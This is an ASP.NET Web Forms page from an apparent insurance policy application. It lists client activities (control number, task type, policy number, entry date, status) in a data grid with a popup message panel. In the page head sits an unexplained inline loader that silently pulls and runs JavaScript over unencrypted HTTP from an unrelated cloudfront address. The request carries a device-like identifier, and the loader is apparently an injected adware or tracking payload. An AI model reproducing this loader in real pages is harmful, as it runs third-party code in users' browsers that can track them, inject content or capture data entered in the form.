<%@ Page Language="c#" Inherits="EPolicy.ClientTasks" CodeFile="ClientTasks.aspx.cs" %>

<%@ Register TagPrefix="MaskedInput" Namespace="MaskedInput" Assembly="MaskedInput" %>
<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" />
<head id="Head1" runat="server">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
        .over-top-btn
        {
            width: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>
</head>
<body>
    <form id="Form1" method="post" runat="server">
    <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ToolkitScriptManager2" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <script src="js/jquery-1.12.1.min.js" type="text/javascript"></script>
                <script src="js/jquery.mask.js" type="text/javascript"></script>
                <asp:Literal ID="jvscript" runat="server"></asp:Literal>
                <div class="row row-offcanvasrow-offcanvas-left" style="height: 100%">
                    <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            Activities</h1>
                        <div class="form=group" align="center">
                            <td>
                                <asp:Button ID="btnClose" runat="server" Text="EXIT" Width="155px" OnClick="btnClose_Click" CssClass="btn btn-primary btn-lg">
                                </asp:Button>
                            </td>
                            </tr>
                            <br />
                            <br />
                            <div align="left">
                                <asp:Label ID="Label21" runat="server" Font-Bold="True" ForeColor="Gray" >Activities List</asp:Label>
                            </div>
                        </div>
                        <div class="form-group" align="center">
                            <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                DisplayAfter="10">
                                <ProgressTemplate>
                                    <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                    <span><span class=""></span><span class="" style="font-size: 18px">Please wait...</span></span></ProgressTemplate>
                            </asp:UpdateProgress>
                        </div>
                 
                        <div class="row formWraper" style="padding: 0px;" align="center">
                              <div align="left" style="padding-left:165px;">
                              <br />
                                    <asp:Label ID="LblTotalCases" runat="server"  CssClass="h2 sub-header" ForeColor="#17529B">Total Cases:</asp:Label>
                                    <asp:Label ID="LblError" runat="server" ForeColor="Red" Visible="False" 
                                        Font-Size="11pt" CssClass="labelForControl">Label</asp:Label>
                                </div>                       
                            <div class="col-sm-12" align="center">
                                <br />
                                <div class="table-responsive">
                                    <asp:DataGrid ID="searchIndividual" CssClass="table table-striped" 
                                        runat="server" ItemStyle-HorizontalAlign="center"
                                        HeaderStyle-HorizontalAlign="Center" AutoGenerateColumns="False"
                                        AllowPaging="True" CellPadding="0" AlternatingItemStyle-CssClass="HeadForm3"
                                        AlternatingItemStyle-BackColor="#FEFBF6" HeaderStyle-CssClass="HeadForm2" HeaderStyle-BackColor="#5C8BAE"
                                        ItemStyle-CssClass="HeadForm3"  
                                        OnItemCommand="searchIndividual_ItemCommand" 
                                         Font-Bold="True" Font-Size="14px" BorderColor="Transparent"  PageSize="15"
                                        OnSelectedIndexChanged="searchIndividual_SelectedIndexChanged" Width="80%">
                                       <FooterStyle ForeColor="Black" />
                                            <SelectedItemStyle BackColor="White" CssClass="" HorizontalAlign="Left" />
                                            <EditItemStyle BackColor="White" HorizontalAlign="Center" />
                                            <AlternatingItemStyle HorizontalAlign="Left" BackColor="#EBEBEB" />
                                            <ItemStyle HorizontalAlign="Left" BorderColor="#EBEBEB" />
                                            <HeaderStyle BackColor="Gray" ForeColor="White" Height="30px" HorizontalAlign="Left"
                                                Font-Bold="True" />
                                        <Columns>
                                         <asp:ButtonColumn ButtonType="LinkButton" HeaderStyle-HorizontalAlign="Center" CommandName="Select" Text="&lt;img src='images2/searchGrid.png' width='26px' height='30px' &gt;"
                                                    HeaderText="Select">
                                                  <ItemStyle HorizontalAlign="Center" />
                                            </asp:ButtonColumn>
                                            <asp:BoundColumn DataField="TaskControlID" HeaderText="Control No">
                                                <ItemStyle></ItemStyle>
                                            </asp:BoundColumn>
                                            <asp:BoundColumn DataField="TaskControlTypeDesc" HeaderText="Task Type">
                                                <ItemStyle></ItemStyle>
                                            </asp:BoundColumn>
                                            <asp:BoundColumn DataField="PolicyNo" HeaderText="Policy No">
                                                <ItemStyle></ItemStyle>
                                            </asp:BoundColumn>
                                            <asp:BoundColumn DataField="EntryDate" HeaderText="Entry Date" DataFormatString="{0:d}">
                                                <ItemStyle></ItemStyle>
                                            </asp:BoundColumn>
                                            <asp:BoundColumn DataField="TaskStatusDesc" HeaderText="Status">
                                                <ItemStyle></ItemStyle>
                                            </asp:BoundColumn>
                                        </Columns>
                                       <PagerStyle HorizontalAlign="Center" Mode="NumericPages" BackColor="White" ForeColor="Gray" Font-Size="18px"
                                                PageButtonCount="15" BorderWidth="0px" />
                                    </asp:DataGrid>
                                </div>

                            <br />                         
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            <br />
                            </div>  
                            
                          

                        </div>
                        <asp:Panel ID="pnlMessage" runat="server" CssClass="" Width="450px" BackColor="#F4F4F4"
                            Height="260px">
                            <div class="" style="padding: 0px; border-radius: 5px; background-color:  #036893;
                                color: #FFFFFF; font-size: 14px; font-weight: normal; font-style: normal;
                                background-repeat: no-repeat; text-align: left; vertical-align: bottom;">
                                &nbsp;&nbsp;
                                <asp:Label ID="Label3" runat="server" Font-Bold="False" Font-Italic="False"
                                    Font-Size="14pt" Text="Message..." ForeColor="White" />
                            </div>
                            <div>
                                <table style="background-position: center; width: 430px; height: 175px;">
                                    <tr>
                                        <td align="center" valign="middle">
                                            <asp:Label ID="lblRecHeader" runat="server" Font-Bold="False" Font-Italic="False"
                                                Font-Size="10.5pt" Font-Underline="False" ForeColor="#333333" Text="Message"
                                                Width="350px" CssClass="Labelfield2-14" />
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div class="" align="center">
                                <asp:Button ID="btnAceptar" runat="server" Text="OK" Width="150px" CssClass="btn btn-primary btn-lg btn-block" />
                            </div>
                        </asp:Panel>
                        <Toolkit:ModalPopupExtender ID="mpeSeleccion" runat="server" BackgroundCssClass="modalBackground"
                            DropShadow="True" PopupControlID="pnlMessage" TargetControlID="btnDummy2" OkControlID="btnAceptar">
                        </Toolkit:ModalPopupExtender>
                        <asp:Button ID="btnDummy2" runat="server" Visible="true" BackColor="Transparent"
                            BorderStyle="None" BorderWidth="0" BorderColor="Transparent" />
                        <Toolkit:RoundedCornersExtender ID="RoundedCornersExtender2" runat="server" TargetControlID="pnlMessage"
                            Radius="10" Corners="All" />
                    </div>                 
                </div>
                 
                </div>
            </ContentTemplate>
        </asp:UpdatePanel>
    </form>
    </div>
</body>
</html> 